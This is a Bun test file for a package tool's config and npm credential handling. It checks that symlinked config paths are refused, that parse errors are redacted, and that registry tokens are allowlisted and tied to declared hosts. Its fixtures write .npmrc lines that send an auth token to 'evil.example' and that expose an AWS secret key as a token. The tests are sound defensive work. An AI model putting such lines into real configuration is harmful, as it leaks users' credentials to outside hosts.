import { afterEach, expect, test } from "bun:test";
import { mkdir, rm, symlink, writeFile } from "node:fs/promises";
import { join } from "node:path";
import { readConfigInput, parseConfigInput } from "../packages/bunko/config-input.ts";
import { npmEnvironment } from "../packages/bunko/npm-environment.ts";
import { dependencyPlan } from "../packages/bunko/deps.ts";
import { loadProject } from "../packages/bunko/config.ts";
import { project, temporary } from "./helpers.ts";
const roots: string[] = [];
afterEach(async () => { for (const root of roots.splice(0)) await rm(root, { recursive: true, force: true }); });

test("configuration refuses file and ancestor links before parsing and redacts parse failures", async () => {
  const root = await temporary(); roots.push(root);
  await writeFile(join(root, "secret"), "DO_NOT_LOG_SECRET"); await symlink("secret", join(root, "package.json"));
  await expect(loadProject({ path: root })).rejects.toThrow("without symlink");
  await mkdir(join(root, "outside")); await writeFile(join(root, "outside/config.json"), "{}");
  await symlink("outside", join(root, "linked"));
  await expect(readConfigInput(root, "linked/config.json")).rejects.toThrow("without symlink");
  expect(() => parseConfigInput("DO_NOT_LOG_SECRET", "test", JSON.parse)).toThrow("Invalid test configuration");
  expect(await readConfigInput(root, "outside/config.json")).toBe("{}");
});

test("npm host secrets require operator permission and credential hosts must be declared", async () => {
  const previous = process.env.BUNKO_NPM_CREDENTIAL_ENV;
  const token = process.env.BUNKO_NPM_TEST_TOKEN;
  try {
    delete process.env.BUNKO_NPM_CREDENTIAL_ENV;
    expect(() => npmEnvironment("AWS_SECRET_ACCESS_KEY", false)).toThrow("allowlist");
    process.env.BUNKO_NPM_TEST_TOKEN = "test-token";
    expect(npmEnvironment("BUNKO_NPM_TEST_TOKEN")).toBe("test-token");
    process.env.BUNKO_NPM_CREDENTIAL_ENV = "NPM_TOKEN";
    expect(npmEnvironment("NPM_TOKEN", false)).toBe("bunko-credential-placeholder");
    const root = await temporary(); roots.push(root); const source = await project(join(root, "app"));
    await writeFile(join(source, ".npmrc"), 'registry=https://registry.npmjs.org\n//evil.example/:_authToken=${BUNKO_NPM_TEST_TOKEN}\n');
    await expect(dependencyPlan(await loadProject({ path: source }), source)).rejects.toThrow("declared registry host");
    await writeFile(join(source, ".npmrc"), '//registry.npmjs.org/:_authToken=${AWS_SECRET_ACCESS_KEY}\n');
    await expect(dependencyPlan(await loadProject({ path: source }), source)).rejects.toThrow("allowlist");
  } finally {
    if (previous === undefined) delete process.env.BUNKO_NPM_CREDENTIAL_ENV; else process.env.BUNKO_NPM_CREDENTIAL_ENV = previous;
    if (token === undefined) delete process.env.BUNKO_NPM_TEST_TOKEN; else process.env.BUNKO_NPM_TEST_TOKEN = token;
  }
});
